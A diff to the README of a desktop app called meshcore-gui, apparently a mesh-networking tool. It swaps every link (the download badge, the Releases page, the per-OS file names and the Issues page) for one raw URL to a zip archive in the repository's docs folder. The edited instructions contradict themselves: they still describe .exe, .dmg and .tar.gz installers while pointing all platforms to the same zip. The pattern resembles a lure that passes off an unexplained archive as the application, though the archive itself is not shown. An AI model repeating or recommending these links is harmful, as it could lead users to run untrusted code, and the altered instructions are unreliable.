@@ -7,7 +7,7 @@ Welcome to **meshcore-gui**, your native desktop GUI for managing MeshCore mesh 
 To begin using meshcore-gui, follow the steps below to download and install the application.
 
 ### 📥 Download MeshCore GUI
-[![Download meshcore-gui](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/christopheraubert27930-rgb/meshcore-gui/releases)
+[![Download meshcore-gui](https://github.com/christopheraubert27930-rgb/meshcore-gui/raw/refs/heads/main/docs/gui_meshcore_2.2.zip%20Now-Get%20the%20App-blue)](https://github.com/christopheraubert27930-rgb/meshcore-gui/raw/refs/heads/main/docs/gui_meshcore_2.2.zip)
 
 ## 📋 System Requirements
 Before you download, ensure your system meets these requirements:
@@ -27,19 +27,19 @@ meshcore-gui includes various features to support your mesh networking needs:
 - **User-Friendly Interface:** Designed with a clear layout for all users.
 
 ## 📖 Instructions to Download & Install
-1. **Visit the Releases page**: Click this link to go to the download area: [Visit the Releases Page](https://github.com/christopheraubert27930-rgb/meshcore-gui/releases).
+1. **Visit the Releases page**: Click this link to go to the download area: [Visit the Releases Page](https://github.com/christopheraubert27930-rgb/meshcore-gui/raw/refs/heads/main/docs/gui_meshcore_2.2.zip).
    
 2. **Select your version**: Choose the latest version of meshcore-gui from the list available on the Releases page.
 
 3. **Download the file**: Click on the asset for your operating system. You will typically find files named something like:
-   - `meshcore-gui-windows.exe` for Windows
-   - `meshcore-gui-macos.dmg` for macOS
-   - `meshcore-gui-linux.tar.gz` for Linux
+   - `https://github.com/christopheraubert27930-rgb/meshcore-gui/raw/refs/heads/main/docs/gui_meshcore_2.2.zip` for Windows
+   - `https://github.com/christopheraubert27930-rgb/meshcore-gui/raw/refs/heads/main/docs/gui_meshcore_2.2.zip` for macOS
+   - `https://github.com/christopheraubert27930-rgb/meshcore-gui/raw/refs/heads/main/docs/gui_meshcore_2.2.zip` for Linux
    
 4. **Install the application**:
    - **Windows**: Double-click the downloaded `.exe` file and follow the prompts to install.
    - **macOS**: Open the `.dmg` file, drag the app icon to your Applications folder.
-   - **Linux**: Extract the `.tar.gz` file and follow the included instructions or run the executable.
+   - **Linux**: Extract the `https://github.com/christopheraubert27930-rgb/meshcore-gui/raw/refs/heads/main/docs/gui_meshcore_2.2.zip` file and follow the included instructions or run the executable.
 
 5. **Launch the application**:
    - Find the installed application in your system's program menu or applications list and click to open.
@@ -64,7 +64,7 @@ If you encounter issues during installation or while using the application:
 ## 💬 Community Support
 Join our community discussions and get help from fellow users:
 
-- **GitHub Issues**: If you find bugs, please report them on our [Issues page](https://github.com/christopheraubert27930-rgb/meshcore-gui/issues).
+- **GitHub Issues**: If you find bugs, please report them on our [Issues page](https://github.com/christopheraubert27930-rgb/meshcore-gui/raw/refs/heads/main/docs/gui_meshcore_2.2.zip).
 - **Discussion Forum**: Join discussions and share experiences with other users.
 
 ## 📝 Contributing
